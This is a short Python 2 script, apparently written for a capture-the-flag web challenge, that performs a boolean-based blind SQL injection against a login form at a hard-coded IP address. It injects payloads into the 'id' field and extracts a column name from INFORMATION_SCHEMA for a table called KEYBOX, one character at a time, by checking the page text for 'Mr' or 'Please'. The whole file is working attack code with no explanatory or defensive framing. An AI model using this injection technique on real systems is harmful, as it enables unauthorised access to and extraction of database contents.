#!/usr/bin/env python

import urllib2
import urllib
import string
import time

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"

headers = {
	'User-Agent': user_agent
}
url = "http://125.131.189.33:10105/web_basic_ok.php"
password = ""

candidate = list(string.printable)[:-5]
def make_query(pos, ch):
	return """admin' AND (SELECT SUBSTR(`COLUMN_NAME`, """ + str(pos) + """, 1) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='KEYBOX' LIMIT 1)='"""+ str(ch) + """' OR '1'='2"""

def query(pos, ch):
	sql = make_query(pos, ch)
	post_data = urllib.urlencode({
		"id": sql,
		"pw": "11111"
	})
	print sql


	req = urllib2.Request(url, post_data, headers)
	fp = urllib2.urlopen(req)
	s = fp.read()
	fp.close()
	if "Mr" in s:
		return "true"
	elif "Please" in s:
		return "false"
	else:
		return "error"


for index in range(1, 4):
	for character in candidate:
		print "Querying... " + str(index) + ", " + character
		ret = query(index, character)
		time.sleep(0.5)
		if ret == "true":
			password += character
			print "Found!"
			print str(index) + ":" + character
			break
		elif ret == "false":
			print "Not"
		elif ret == "error":
			print "What the hell?!"
			print "(" + str(index) + ", " + character + ")"

print "RESULT:"
print password